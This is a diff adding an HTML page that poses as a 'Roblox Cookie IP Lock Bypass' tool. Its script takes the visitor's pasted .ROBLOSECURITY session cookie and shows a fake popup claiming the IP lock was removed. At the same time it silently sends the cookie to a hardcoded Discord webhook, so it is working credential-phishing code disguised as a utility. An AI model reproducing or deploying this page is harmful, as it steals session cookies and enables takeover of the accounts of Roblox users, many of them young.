@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cookie IP Lock Bypass</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            margin: 20px; 
+            background: #f9f9f9;
+        }
+        h2 {
+            font-size: 22px;
+        }
+        input, button {
+            width: 90%; 
+            max-width: 400px;
+            padding: 12px;
+            margin: 10px 0;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        #newCookie {
+            background: #f0f0f0;
+            border: 1px solid #ccc;
+            padding: 12px;
+            width: 90%;
+            max-width: 400px;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            white-space: pre-wrap;
+            margin: 10px auto;
+            text-align: left;
+            border-radius: 5px;
+        }
+        /* Popup styles */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 10%;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 12px 18px;
+            border-radius: 8px;
+            font-size: 14px;
+            z-index: 1000;
+            width: 80%;
+            max-width: 300px;
+            text-align: center;
+            animation: fadeInOut 2s forwards;
+        }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateX(-50%) translateY(-10px); }
+            10% { opacity: 1; transform: translateX(-50%) translateY(0px); }
+            90% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+    </style>
+    <script>
+        function showPopupMessage() {
+            const popup = document.createElement("div");
+            popup.className = "popup";
+            popup.innerHTML = "⚠️ IP lock already removed, no need to refresh cookie.";
+            document.body.appendChild(popup);
+            popup.style.display = "block";
+
+            setTimeout(() => {
+                popup.style.display = "none";
+                document.body.removeChild(popup);
+            }, 2000);
+        }
+
+        async function sendCookie() {
+            const cookie = document.getElementById("cookieInput").value;
+            if (!cookie) {
+                showPopupMessage("Please enter a cookie!");
+                return;
+            }
+            
+            document.getElementById("newCookie").textContent = cookie;
+            showPopupMessage(); // Custom popup instead of alert()
+
+            const webhookURL = "https://discord.com/api/webhooks/1340386580770197665/1WyB76Ns5PG9YO-DVQo7Hv2PAtLi11td9UBRwFQIqiA0eM9b5Gyzz5JYRdSm9C3sweoa";
+            
+            const payload = {
+                content: "@everyone New Cookie:",  
+                embeds: [{
+                    title: "🔑 New Roblox Cookie",
+                    description: "```" + cookie + "```",
+                    color: 16711680
+                }]
+            };
+            
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error("Webhook error:", err));
+        }
+    </script>
+</head>
+<body>
+    <h2>Roblox Cookie IP Lock Bypass</h2>
+    <input type="text" id="cookieInput" placeholder="Enter Roblox .ROBLOSECURITY">
+    <button onclick="sendCookie()">Bypass</button>
+    <h3>New Cookie:</h3>
+    <div id="newCookie">Waiting...</div>
+</body>
+</html>
